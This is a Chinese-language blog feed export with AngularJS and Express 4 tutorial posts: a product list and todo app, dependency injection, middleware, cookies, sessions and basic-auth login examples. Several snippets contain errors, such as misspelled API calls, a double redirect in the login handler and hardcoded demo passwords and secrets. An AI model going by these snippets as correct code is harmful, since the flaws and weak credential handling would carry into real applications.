class=\"pull-right btn-group\"&gt; &lt;a ng-repeat=\"page in data.products | filter:categoryFilterFn | pageCount:pageSize\" ng-click=\"selectPage($index + 1)\" class=\"btn btn-default\" ng-class=\"getPageClass($index + 1)\"&gt; &#123;&#123;$index + 1&#125;&#125; &lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 全局模块-公用控制器 sportsStore.js12345678910111213141516171819202122232425/// &lt;reference path=\"../angular.js\" /&gt;angular.module(\"sportsStore\") // 此处仅是获取sportsStore模块（已在其他文件中初始化了）.controller(\"sportsStoreCtrl\", function ($scope) &#123; // 创建名为sportsStoreCtrl控制器 // 在scope上定义一个data对象作为模型，products数组表示所有的产品 // 每一个产品有独立的名称、价格以及描述，所属的分类 $scope.data = &#123; products: [ // 此处的products先模拟4个产品用于自测（以后可使用ajax从服务器获取产品列表） &#123; name: \"Product #1\", description: \"A product\", category: \"Category #1\", price: 100 &#125;, &#123; name: \"Product #2\", description: \"A product\", category: \"Category #1\", price: 110 &#125;, &#123; name: \"Product #3\", description: \"A product\", category: \"Category #2\", price: 210 &#125;, &#123; name: \"Product #4\", description: \"A product\", category: \"Category #3\", price: 202 &#125;] &#125;;&#125;); 仅仅只用于展示产品的控制器productListController.js之所以不在sportsStoreCtrl控制器中是由于考虑到还有其他模块及其对应的控制器，所以将产品列表的控制器独立出来123456789101112131415161718192021222324252627282930313233343536/// &lt;reference path=\"../angular.js\" /&gt;angular.module(\"sportsStore\") // 此处仅是获取sportsStore模块（已在其他文件中初始化了） .constant(\"productListActiveClass\", \"btn-primary\") // 此处定义常量productListActiveClass，表示选中项的class名称 .constant(\"productListPageCount\", 3) // 此处定义常量productListPageCount，表示分页时每页产品的数量 .controller(\"productListCtrl\", function ($scope, $filter, // 定义产品列表控制器，在函数参数中先指定依赖的模块或服务或常量 productListActiveClass, productListPageCount) &#123; var selectedCategory = null; // 表示当前所选择的产品类别 $scope.selectedPage = 1; // 表示当前所在页数 $scope.pageSize = productListPageCount; // 表示每页产品数量 // 视图上绑定分类列表项函数 $scope.selectCategory = function (newCategory) &#123; selectedCategory = newCategory; $scope.selectedPage = 1; &#125; // 选定页数的函数 $scope.selectPage = function (newPage) &#123; $scope.selectedPage = newPage; &#125; // 过滤分类 $scope.categoryFilterFn = function (product) &#123; return selectedCategory == null || product.category == selectedCategory; &#125; // 确定分类的class $scope.getCategoryClass = function (category) &#123; return selectedCategory == category ? productListActiveClass : \"\"; &#125; // 确定当前页的class $scope.getPageClass = function (page) &#123; return $scope.selectedPage == page ? productListActiveClass : \"\"; &#125; &#125;); #在该文件中定义所有的过滤器customFilters.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/// &lt;reference path=\"../angular.js\" /&gt;angular.module(\"customFilters\", []) // 定义customFilters模块，作为过滤器集合.filter(\"unique\", function () &#123; // 返回data中所有唯一的propertyName属性数组 return function (data, propertyName) &#123; if (angular.isArray(data) &amp;&amp; angular.isString(propertyName)) &#123; var results = []; var keys = &#123;&#125;; for (var i = 0; i &lt; data.length; i++) &#123; var val = data[i][propertyName]; if (angular.isUndefined(keys[val])) &#123; keys[val] = true; results.push(val); &#125; &#125; return results; &#125; else &#123; return data; &#125; &#125;&#125;).filter(\"range\", function ($filter) &#123; // 获取指定区间的索引数目，以数组形式返回 return function (data, page, size) &#123; if (angular.isArray(data) &amp;&amp; angular.isNumber(page) &amp;&amp; angular.isNumber(size)) &#123; var start_index = (page - 1) * size; // 获取本页面开始的产品索引数 if (data.length &lt; start_index) &#123; return []; &#125; else &#123; // $filter(\"limitTo\")(input, size)方法，选取input数组中的前size个记录， return $filter(\"limitTo\")(data.splice(start_index), size); &#125; &#125; else &#123; return data; &#125; &#125;&#125;).filter(\"pageCount\", function () &#123; // 根据data和size，计算页面总数 return function (data, size) &#123; if (angular.isArray(data)) &#123; var result = []; for (var i = 0; i &lt; Math.ceil(data.length / size) ; i++) &#123; result.push(i); &#125; return result; &#125; else &#123; return data; &#125; &#125;&#125;); 博客源码地址","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-7-AngularJS+MongoDB+Nodejs","slug":"angularjs7","date":"2017-05-03T07:56:41.000Z","updated":"2017-05-03T07:56:41.000Z","comments":true,"path":"2017/05/03/angularjs7/","link":"","permalink":"https://github.com/xmoyKING/2017/05/03/angularjs7/","excerpt":"","text":"上一本权威指南初略的刷了一遍后找出了很多命令和知识点，这次大致刷了一遍《AngularJS开发下一代Web应用》，发现还是有些问题： 第三章没有图片，无法理清逻辑，第四章的测试小结需要在熟悉angular练习小项目之后再重新看一遍。 使用Jasmine进行单元测试，以及用angular-mock模拟数据。 所以先暂停刷书，直接上手开干！ 《Nodejs+MongoDB+AngularJS Web开发》Angularjs提供了一些基本的全局使用的工具方法，这些方法可以通过angular对象直接访问,比如深拷贝方法：1var myCopy = angular.copy(myObj); 全局API： copy(src, [dst]) 创建一个src对象/数组的深拷贝，dst为可选的目的对象 element(element) 返回一个jQuery包装后的DOM元素，若在ng之前加载jQuery库，则返回对象是一个完成的jQuery对象，否则为ng内置的精简版 equals(o1, o2) 比较对象，使用 === 实现 extend(dst, src) 继承 forEach(obj, iterator, [context]) 遍历对象/数组，（js原生只能对数组使用这个方法），iterator是一个函数，接受两个参数value， key fromJson(json) 将JSON字符串转换为一个js对象 toJson(obj) 将js对象转换为JSON字符串 isArray(value) isDate(value) isDefined(value) isElement(value) 包括DOM，jQuery元素， isFunction(value) isNumber(value) isObject(value) isString(value) isUndefined(value) lowercase(string) uppercase(string) 一个基本的express + angularjs 的入门示例：目录结构为：/app_server.js 项目启动入口/static/first.html 静态页面/static/js/first.js ng代码 /app_server.js文件内容：123456var express = require('express');var app = express();app.use('/', express.static('./static')). use('/images', express.static( '../images')). use('/lib', express.static( '../lib'));app.listen(80); /static/first.html 内容：12345678910111213141516171819&lt;!doctype html&gt;&lt;html ng-app=\"firstApp\"&gt; &lt;head&gt; &lt;title&gt;First AngularJS App&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div ng-controller=\"FirstController\"&gt; &lt;span&gt;Name:&lt;/span&gt; &lt;input type=\"text\" ng-model=\"first\"&gt; &lt;input type=\"text\" ng-model=\"last\"&gt; &lt;button ng-click='updateMessage()'&gt;Message&lt;/button&gt; &lt;hr&gt; &#123;&#123;heading + message&#125;&#125; &lt;/div&gt; &lt;script src=\"http://code.angularjs.org/1.2.9/angular.min.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/first.js\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; /static/js/first.js 内容：123456789var firstApp = angular.module('firstApp', []);firstApp.controller('FirstController', function($scope) &#123; $scope.first = 'Some'; $scope.last = 'One'; $scope.heading = 'Message: '; $scope.updateMessage = function() &#123; $scope.message = 'Hello ' + $scope.first +' '+ $scope.last + '!'; &#125;;&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-6-做一个todo小程序","slug":"angularjs6","date":"2017-05-01T06:34:50.000Z","updated":"2017-05-01T06:34:50.000Z","comments":true,"path":"2017/05/01/angularjs6/","link":"","permalink":"https://github.com/xmoyKING/2017/05/01/angularjs6/","excerpt":"","text":"先做一个静态HTML程序，一个todo小程序（待办事项小应用）, angularjs版本为1.2 界面效果如下图: 目录组织结构：12345678angularjs #项目目录 angular.js #文件 bootstrap-theme.css bootstrap.css todo.html #静态html文件 todo.json #json数据，模拟请求node_modules #node包目录server.js #启动静态服务器的入口文件 node插件connect创建静态服务器其中server.js使用到了connect,而connect分为两种版本，一个2.x,一个是最新的3.x参考node报错：connect.static is not a function 安装connect2:npm install connect@2.x.x --save若使用2.x则创建Web服务器的代码如下：12345var connect = require('connect');connect.createServer( connect.static(\"./angularjs\")).listen(5000); 使用如下命令安装connect3:npm install connect --savenpm install server-static --save而在最新的connect3版本中，将非核心功能分离，由一些中间件实现1234567var connect = require('connect');var serverStatic = require('serve-static');var app = connect();app.use(serverStatic(\"./angularjs\"));app.listen(5000); todo.json中存储着一些数据，这些数据使用ajax动态加载到ng应用中1234[&#123; \"action\": \"Buy Flowers\", \"done\": false &#125;, &#123; \"action\": \"Get Shoes\", \"done\": false &#125;, &#123; \"action\": \"Collect Tickets\", \"done\": true &#125;, &#123; \"action\": \"Call Joe\", \"done\": false &#125;] todo.html为了方便，将所有的html和ngjs逻辑都在todo.html中，同时将代码解释以注释的形式直接写在代码中，更加清晰和方便。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;!DOCTYPE html&gt;&lt;!-- 1.1 --&gt;&lt;!-- data-ng-app=\"todoApp\" 将html标签和todoApp这个模块绑定， --&gt;&lt;!-- 此处告诉ng从此处标签开始，其内部的标签即ng的范围，即模块的作用范围 --&gt;&lt;html data-ng-app=\"todoApp\"&gt;&lt;head&gt; &lt;title&gt;TO DO List&lt;/title&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;!--1.0 --&gt; &lt;!--导入angularjs库，一般是放在head处，在dom之前加载，防止html中ng未初始化--&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script&gt; // 1.3 // 定义模型，将数据从HTML中分离出来，本模型仅仅预先定义了一个user属性， // 其他的数据可以使用ajax动态获取 var model = &#123; user: \"KING\" &#125;; // 1.2 // ng应用是由模块组成的(一个或多个)，由angular.module函数定义模块， // 此处定义模块名为todoApp为第一个参数， // 第二个参数是该模块的依赖模块名，即若本模块需要依赖其他已存在的模块，则依次写在数组内即可， // 若没有依赖也不能不传值，至少为一个空数组 var todoApp = angular.module(\"todoApp\", []); // 3.3 // 将使用ajax的方式获取数据，ajax回调数据作为模型中的items存储， // 此处的函数参数为$http, 为ng提供的默认服务之一 todoApp.run(function ($http) &#123; // get返回的是一个promise对象， $http.get(\"todo.json\").success(function (data) &#123; model.items = data; &#125;); &#125;); // 3.1 // 使用ng提供的过滤器接口，定一个新的过滤器，控制显示item的详细数据 todoApp.filter(\"checkedItems\", function () &#123; // 此处的checkedItems过滤器需要两个参数，一个items为ng提供，表示应该被过滤的对象集合 // showComplete为手动提供的参数，用于确定是否需要包含过滤后的数据 return function (items, showComplete) &#123; var resultArr = []; angular.forEach(items, function (item) &#123; if (item.done == false || showComplete == true) &#123; resultArr.push(item); &#125; &#125;); return resultArr; &#125; &#125;); // 2.1 // 在module返回的模块上使用controller创建一个控制器， // 参数为控制器的名称，以及一个函数，该函数定义了控制器的功能，同时向用户展示的视图提供数据 // 函数的参数为内置的服务或其他自定义的服务，这些对象提供了一些方法和功能，以便本控制器使用 // $scope表示ng提供的内置服务，一般用于向视图暴露数据和功能 todoApp.controller(\"ToDoCtrl\", function ($scope) &#123; // 2.3 // 在scope对象上一定一个todo属性，同时将model赋值给它 // 这样是为了模型数据能被视图（通俗理解为界面或dom）使用， // 也就是说，一般向视图加载的数据都应该通过scope， // 而不是直接使用js操作dom，修改其value，text，attr，html的值 $scope.todo = model; // 2.7 // 在scope上定义函数，用于计算未完成item的数量 $scope.incompleteCount = function () &#123; var count = 0; angular.forEach($scope.todo.items, function (item) &#123; if (!item.done) &#123; count++ &#125; &#125;); return count; &#125; // 输出数量外观等级class的函数 $scope.warningLevel = function () &#123; return $scope.incompleteCount() &lt; 3 ? \"label-success\" : \"label-warning\"; &#125; // 用于添加新item的函数，该函数接收一个参数，表示新item，同时设置新item的状态 $scope.addNewItem = function (actionText) &#123; $scope.todo.items.push(&#123; action: actionText, done: false &#125;); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;!-- 2.2 --&gt;&lt;!-- 使用ng-controller将标签和控制器绑定，也就是说，一个模块可能拥有多个控制器 --&gt;&lt;body ng-controller=\"ToDoCtrl\"&gt; &lt;div class=\"page-header\"&gt; &lt;h1&gt; &lt;!-- 2.4 --&gt; &lt;!-- 使用&#123;&#123; 表达式 &#125;&#125;将scope中的数据绑定带dom上，也就是说不需要用js的原生语法或jq去操作dom中的数据--&gt; &lt;!-- 此处的todo即$scope上的todo属性,user即model上的user属性 --&gt; &#123;&#123;todo.user&#125;&#125;'s To Do List &lt;span class=\"label\" ng-class=\"warningLevel()\" ng-hide=\"incompleteCount() == 0\"&gt; &#123;&#123;incompleteCount()&#125;&#125; &lt;/span&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div class=\"panel\"&gt; &lt;div class=\"input-group\"&gt; &lt;input class=\"form-control\" ng-model=\"actionText\" /&gt; &lt;span class=\"input-group-btn\"&gt; &lt;!-- 2.8 --&gt; &lt;!-- ng-click表示每次点击都将actionText当做参数传入addNewItem中，而actionText与input相互绑定。即输入框内的值 --&gt; &lt;button class=\"btn btn-default\" ng-click=\"addNewItem(actionText)\"&gt; Add &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; &lt;table class=\"table table-striped\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Description&lt;/th&gt; &lt;th&gt;Done&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;!-- 2.5 --&gt; &lt;!-- 使用ng-repeat指令迭代todo.items的值， --&gt; &lt;!-- 3.2 --&gt; &lt;!-- 使用|表示对item的数据过滤，同时使用自定义的checkedItems过滤器和ng默认提供的orderBy过滤器 --&gt; &lt;!-- orderBy使用的排序字段为action，即item的action属性 --&gt; &lt;tr ng-repeat=\"item in todo.items | checkedItems:showComplete | orderBy:'action'\"&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;!-- 2.6 --&gt; &lt;!-- 使用ng-model双向绑定当前item的done属性到复选框上 --&gt; &lt;td&gt;&lt;input type=\"checkbox\" ng-model=\"item.done\" /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;div class=\"checkbox-inline\"&gt; &lt;!-- 2.6 --&gt; &lt;!-- --&gt; &lt;label&gt;&lt;input type=\"checkbox\" ng-model=\"showComplete\"&gt; Show Complete&lt;/label&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 博客源码地址","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-5-模块和依赖注入","slug":"angularjs5","date":"2017-04-30T14:58:43.000Z","updated":"2017-04-30T14:58:43.000Z","comments":true,"path":"2017/04/30/angularjs5/","link":"","permalink":"https://github.com/xmoyKING/2017/04/30/angularjs5/","excerpt":"","text":"Angularjs最需要重点了解的是依赖注入，以及依赖注入和模块的联系。依赖注入使Angularjs模块保持一个非常整洁、有组织的形式，并更容易访问其他模块，当正确使用的时候，能减少很多工作量。 Angularjs模块Angularjs模块是一种容器，它使代码隔离并组织成简洁、可复用的块。模块本身不提供直接的功能，但它包含其他提供了功能的对象的实例，如控制器、过滤器、服务、动画等。 通过定义angularjs提供的对象来构建模块，然后通过依赖注入将这些模块连接在一起，构成一个完整的项目。 Angularjs建立在模块之上，大部分由Angularjs提供的功能都内置到一个ng模块中，包含了大部分的指令和服务。 同时，模块对象也有一些初始的方法： filter(name, factory) 创建一个对数据进行格式化的过滤器（多用在视图中，也可通过$filter(name)获取） controller(name, constructor) 创建一个控制器 directive(name, factory) 创建一个指令，可以看作是对HTML的扩展 value(name, value) 定义一个常量的服务 constant(key, value) 定义一个常量的服务，与value相互区别 factory(name, provider) 创建一个服务， service(name, constructor) 创建一个服务 provider(name, type) 注意provider、factory、service三者相互区别 run(callback) 注册一个在AngularJS加载完后对所有模块进行配置的函数 config(callback) 注册一个在模块加载时对该模块进行配置的函数 name 返回模块名称 animation(name, factory) 支持动画 依赖注入依赖注入是许多服务器端语言的设计模式的一种，Angularjs依赖注入的思想是定义依赖对象并动态的将它注入另一个对象，使所有的依赖对象所提供的功能都可用， 理解依赖注入先从理解其是要解决什么问题开始，一个AngularJS应用中的一些组件将会依赖于其他组件。比如：控制器需要使用$scope组件，向视图传递数据，所以控制器依赖于$scope组件。 依赖注入简化了组件之间处理依赖的过程（即解决依赖），没有依赖注入，就不得不以某种方式自己查找$scope，很有可能使用全局变量，虽然也可以完成同样工作，但是没有使用依赖注入这么方便易用（不考虑依赖注入的实现和原理） 依赖注入改变了函数参数的作用，AngularJS应用中一个组件通过在工厂函数的参数上声明依赖.没有依赖注入，参数会被用于接收调用者传入的任何对象(无法保证该对象具有我们想要的方法和属性)，但有了依赖注入，函数使用参数提出依赖需求，AngularJS自动为你找到这个组件。 同时AngularJS的依赖注入工作方式允许你任意声明依赖的顺序，即以下两种声明依赖的方式作用和结果一样。123myApp.controller('myAppCtrl', function($scope, $filter)&#123; ... &#125;)myApp.controller('myAppCtrl', function($filter,$scope)&#123; ... &#125;) Angularjs通过provider和injector这两种服务实现依赖注入。 provider本质上是一个对象，这个对象定义了如何创建一个具有所有必要功能的对象实例的方式，一个模块将provider注册到injector的服务中，然后angularjs中，一个provider对象只创建一个实例，即provider为单例模式。 injector则负责跟踪provider对象的实例，只要一个模块注册了provider，就会创建一个injector实例，当一个provider对象发出一个依赖的请求时，injector就会先检查injecotr的缓存，查看是否该实例已经存在,若在则直接使用，若没有在缓存中找到则使用provider的定义创建一个新的实例，并将其缓存起来，以备后用，最后将实例返回。 创建模块创建一个Angularjs模块是非常简单的过程，使用angularjs.module(name, [require], [configFn])方法即可，这个方法创建一个Module对象的实例，将它注册到injector中，然后返回这个新建的Module实例，比如：123var myModule = angularjs.mudole('myModule', ['$window', '$http'], function()&#123; $provide.value('myValue', 'Some value');&#125;) 若不指定require，则module方法会作为getter返回实例。1var myModuleInstance = angularjs.module('myModule'); 当一个模块被定义时，执行Angularjs模块的配置阶段，在此阶段，任何provider都被注册到injector中，在模块实例对象上使用config方法配置。12345var myModule = angularjs.module('myModule', []) .config(function($provide, $filterProvider)&#123; $provide.value('startTime', new Date()); $filterProvider.register('myFilter', function()&#123;&#125;); &#125;); 一旦配置完成，则到了Angularjs模块的运行阶段，在此阶段可实现实话模块所需的代码。在运行时，不能实现任何provider代码，因为在此时，整个模块已经完成配置并注册到injetor中。123myModule.run(function(startTime)&#123; startTime.setTime((new Date()).getTime());&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"Express4-2中间件","slug":"express-middleware","date":"2017-04-30T08:47:31.000Z","updated":"2017-04-30T08:47:31.000Z","comments":true,"path":"2017/04/30/express-middleware/","link":"","permalink":"https://github.com/xmoyKING/2017/04/30/express-middleware/","excerpt":"","text":"Express提供的大部分功能都是通过中间件函数完成的，这些中间件就如同一个又一个封装并扩展了http模块功能的插件，通过他们能极大减少工作量。中间件的提供了一些功能，一般在接收到请求前，处理请求时，和发送响应时这三者之间调用。比如身份认真，cookie和会话，静态文件，POST请求。 Express中间件框架的底层是connect模块，基于这个底层中间件模块，Express支持许多中间件组件，例如： static： 允许服务器以流式处理静态文件的GET请求，这个中间件是Express内置的，不需要安装，通过express.static()就可以使用 express-logger：一个格式化的请求日志，记录服务器接收到的请求 basic-auth-connect: 提供对基本HTTP身份验证的功能 cookie-parse: 读取请求中附带的cookie并设置响应中的cookie cookie-session: 提供基于cookie的会话功能 express-session: 另一种会话功能 body-parse: 将POST请求中的JSON数据解析为req.body的属性 compression： 提供Gzip压缩 csurf： 提供跨站点请求访问伪造保护功能 以上中间件都需要通过npm安装后才能导入使用 使用中间件在Express App对象上使用use([path], middleware)方法，可对所有的路由指定该中间件，省略path则默认&#39;/&#39;，表示所有路径，middleware则是一个函数，传递给该函数的参数如function(req, res, next)，req是Request对象，Response对象，next是下一个执行的中间件函数 每个中间件都有一个构造函数，返回的实例对象提供了对应的中间件功能，例如：123456// 在所有路径都应用body-parser中间件const express = require('express');const bodyParser = require('body-parser');var app = express();app.use('/', bodyParse()); 若只对某个路由使用中间件，则可以修改path参数。1234567891011const express = require('express');const bodyParser = require('body-parser');var app = express();app.get('/parsedRoute', bodyParser(), function(req, res)&#123; res.send('parsed');&#125;)app.get('/otherRoute', bodyParser(), function(req, res)&#123; res.send('no parsed');&#125;) 添加多个中间件,但是需要注意中间件的使用顺序，一些中间件之间是可以有依赖关系的：1234567const express = require('express');const bodyParser = require('body-parser');const cookieParser = require('cookie-parser');const session = require('express-session');var app = express();app.use('/', bodyParse()).use('/',cookieParser()).use('/', session()); query中间件query中间件将一个url查询字符串转换为js对象，保存在Request对象的query属性中，从Express4开始，内置该中间件。123456789const express = require('express');var app = express();app.get('/', function(req, res)&#123; var id = req.query.id; var score = req.query.score; console.log(JSON.stringify(req.query)); res.send('done');&#125;);// 查询字符串为?id=1&amp;score=95 静态文件服务express的static中间件能直接从磁盘将静态文件输出到客户端1express.static(path, [options]) path指定请求引用的静态文件所在的根目录，options可以设置如下属性： maxAge 浏览器缓存的最长时间，默认为0，单位ms hidden 若为true表示启用传输隐藏文件功能，默认false redirect 若为true表示当请求路径是目录时，则将被重定向到一个有尾随/的路径，默认true index 根路径的默认文件名，默认为index.html12345var express = require('express');var app = express();app.use('/', express.static('./static'), &#123;maxAge: 60*60*1000&#125;);app.use('/images', express.static( '../images'));app.listen(80); POST数据1234567891011121314151617181920212223var express = require('express');var bodyParser = require('body-parser');var app = express();app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.use(bodyParser.json()); // 通过bodyParse.json()将post数据转化为req.body的属性app.get('/', function (req, res) &#123; var response = '&lt;form method=\"POST\"&gt;' + 'First: &lt;input type=\"text\" name=\"first\"&gt;&lt;br&gt;' + 'Last: &lt;input type=\"text\" name=\"last\"&gt;&lt;br&gt;' + '&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt;'; res.send(response);&#125;);app.post('/',function(req, res)&#123; var response = '&lt;form method=\"POST\"&gt;' + 'First: &lt;input type=\"text\" name=\"first\"&gt;&lt;br&gt;' + 'Last: &lt;input type=\"text\" name=\"last\"&gt;&lt;br&gt;' + '&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt;' + '&lt;h1&gt;Hello ' + req.body.first + '&lt;/h1&gt;'; // 这里first属性即是json方法转化后添加的 res.type('html'); res.end(response); console.log(req.body);&#125;);app.listen(80); cookie操作cookie操作非常频繁，也很重要，使用cookie-parse中间件可以解析请求中的cookie然后将其作为req.cookies的属性.1express.cookie-parser([secret]); 注：Connect3发布后，cookie-parser重命名为cookie，而且不向后兼容secret参数是利用一个secret字符串在cookie内部，防止cookie篡改。在响应中可以使用res.cookie(name, value, [options])options可以有如下属性： maxAge 指定cookie的过期时间 httpOnly 若为true表示cookie只能由服务器访问，浏览器的js代码无法获取 signed 若为true表示cookie将被签名，使用req.signedCookie对象获取，而不是req.cookie path 指明cookie应用路径123456789101112131415var express = require('express');var cookieParser = require('cookie-parser');var app = express();app.use(cookieParser());app.get('/', function(req, res) &#123; console.log(req.cookies); if (!req.cookies.hasVisited)&#123; res.cookie('hasVisited', '1', &#123; maxAge: 60*60*1000, httpOnly: true, path:'/'&#125;); &#125; res.send(\"Sending Cookie\");&#125;);app.listen(80); 会话cookie-session中间件基于cookie-parser,所以若使用cookie-session则需先添加cookie-parser中间件。12345678910111213141516171819202122232425var express = require('express');var cookieParser = require('cookie-parser');var cookieSession = require('cookie-session');var app = express();app.use(cookieParser());app.use(cookieSession(&#123;secret: 'MAGICALEXPRESSKEY'&#125;));app.get('/library', function(req, res) &#123; console.log(req.cookies); if(req.session.restricted) &#123; res.send('You have been in the restricted section ' + req.session.restrictedCount + ' times.'); &#125;else &#123; res.send('Welcome to the library.'); &#125;&#125;);app.get('/restricted', function(req, res) &#123; req.session.restricted = true; if(!req.session.restrictedCount)&#123; req.session.restrictedCount = 1; &#125; else &#123; req.session.restrictedCount += 1; &#125; res.redirect('/library');&#125;);app.listen(80); 上述代码，若用户访问library则正常，但是若访问restricted后则会被提示已经被限制登录。而且记录访问restricted路径的次数。 基本的身份验证Expressd的basic-auth-connect中间件提供了HTTP基本身份验证，使用Authorization Header从浏览器向服务器发送编码后的用户名和密码。若浏览器内没有存储URL的授权信息，则浏览器会启动基本的登录对话框，让用户登录。1234const basicAuth = require('basic-auth-connect');app.use( express.basicAuth(function(username, passs)&#123; // ……&#125;)); 在全局路由上使用身份验证12345678910var express = require('express');var basicAuth = require('basic-auth-connect');var app = express();app.listen(80);app.use(basicAuth(function(user, pass) &#123; return (user === 'testuser' &amp;&amp; pass === 'test');&#125;));app.get('/', function(req, res) &#123; res.send('Successful Authentication!');&#125;); 在单个路径上使用身份验证12345678910111213var express = require('express');var basicAuth = require('basic-auth-connect');var app = express();var auth = basicAuth(function(user, pass) &#123; return (user === 'user1' &amp;&amp; pass === 'test');&#125;);app.get('/library', function(req, res) &#123; res.send('Welcome to the library.');&#125;);app.get('/restricted', auth, function(req, res) &#123; res.send('Welcome to the restricted section.');&#125;);app.listen(80); 会话身份验证基于HTTP的基本的身份验证很简单，方便，但是若证书被记住，则登录一直存在，所以不是很安全。Express的session中间件对会话机制提供了很完善的功能用来管理会话，可以基于session完善身份验证。 res.session对象上有几个用来管理会话的方法 regenerate([callback]) 重置会话 destroy([callback]) 移除req.session对象 save([callback]) 保存会话数据 touch([callback]) 重置maxAge cookie 将会话链接到浏览器cookie对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263var express = require('express');var bodyParser = require('body-parser');var cookieParser = require('cookie-parser');var session = require('express-session');var crypto = require('crypto'); // 加密模块，用于生成一个安全的密码function hashPW(pwd)&#123; return crypto.createHash('sha256').update(pwd). digest('base64').toString();&#125;var app = express();app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.use(bodyParser.json());app.use(cookieParser('MAGICString'));app.use(session());app.get('/restricted', function(req, res)&#123; if (req.session.user) &#123; res.send('&lt;h2&gt;'+ req.session.success + '&lt;/h2&gt;' + '&lt;p&gt;You have entered the restricted section&lt;p&gt;&lt;br&gt;' + ' &lt;a href=\"/logout\"&gt;logout&lt;/a&gt;'); &#125; else &#123; req.session.error = 'Access denied!'; res.redirect('/login'); &#125;&#125;);app.get('/logout', function(req, res)&#123; req.session.destroy(function()&#123; res.redirect('/login'); &#125;);&#125;);app.get('/login', function(req, res)&#123; var response = '&lt;form method=\"POST\"&gt;' + 'Username: &lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;' + 'Password: &lt;input type=\"password\" name=\"password\"&gt;&lt;br&gt;' + '&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt;'; if(req.session.user)&#123; res.redirect('/restricted'); &#125;else if(req.session.error)&#123; response +='&lt;h2&gt;' + req.session.error + '&lt;h2&gt;'; &#125; res.type('html'); res.send(response);&#125;);app.post('/login', function(req, res)&#123; //user should be a lookup of req.body.username in database var user = &#123;name:req.body.username, password:hashPW(\"myPass\")&#125;; if (user.password === hashPW(req.body.password.toString())) &#123; req.session.regenerate(function()&#123; req.session.user = user; req.session.success = 'Authenticated as ' + user.name; res.redirect('/restricted'); &#125;); &#125; else &#123; req.session.regenerate(function()&#123; req.session.error = 'Authentication failed.'; res.redirect('/restricted'); &#125;); res.redirect('/login'); &#125;&#125;);app.listen(80); 自定义中间件在使用Express时，可以自定义中间件，即提供一个函数，该函数接受三个参数，第一参数为Request对象，第二参数为Response对象，第三参数为next，next是通过中间件框架传递的函数，它指向下一个要执行的中间件，所需必须在退出自定义中间件之前调用next(),否则后面的处理程序永不会被调用。 自定义一个将查询字符串从url剥离的中间件123456789101112131415var express = require('express');var app = express();function queryRemover(req, res, next)&#123; console.log(\"\\nBefore URL: \"); console.log(req.url); req.url = req.url.split('?')[0]; console.log(\"\\nAfter URL: \"); console.log(req.url); next();&#125;;app.use(queryRemover);app.get('/no/query', function(req, res) &#123; res.send(\"test\");&#125;);app.listen(80);","categories":[{"name":"express","slug":"express","permalink":"https://github.com/xmoyKING/categories/express/"}],"tags":[{"name":"express4","slug":"express4","permalink":"https://github.com/xmoyKING/tags/express4/"},{"name":"node","slug":"node","permalink":"https://github.com/xmoyKING/tags/node/"}]},{"title":"Express4-1入门配置","slug":"express","date":"2017-04-30T03:53:55.000Z","updated":"2017-04-30T03:53:55.000Z","comments":true,"path":"2017/04/30/express/","link":"","permalink":"https://github.com/xmoyKING/2017/04/30/express/","excerpt":"","text":"Express提供了轻量级模块，将Node的http模块封装并扩展，能处理路由，响应，cookie等 安装1234npm install express@4.0.0// 使用const express = require('express');var app = express(); 设置Express提供了控制服务器的一些设置，比如如何解析JSON，路由和视图，使用set(setting, value),enable(setting)和disable(setting)方法来设置这些值。1234// 设置信任代理模式，设置模版引擎为jadeapp.enable('trust proxy');app.diable('strict routing');app.set('view engine', 'jade'); 相对应的，使用get(setting)，enabled(setting)和disabled(setting)获取已经设置的值123app.enabled('trust proxy'); // trueapp.diabled('strict routing'); // trueapp.get('view engine'); // jade 常用的设置有： env 定义模式字符串，如development表示开发，testing表示测试，production表示生产，默认为process.env.NODE_ENV trust proxy 禁用/启用反向代理，默认disabled禁用 jsonp callback name 定义JSONP请求的默认回调名称，默认值是?callback= json replacer 定义JSON replacer回调函数，默认null json space 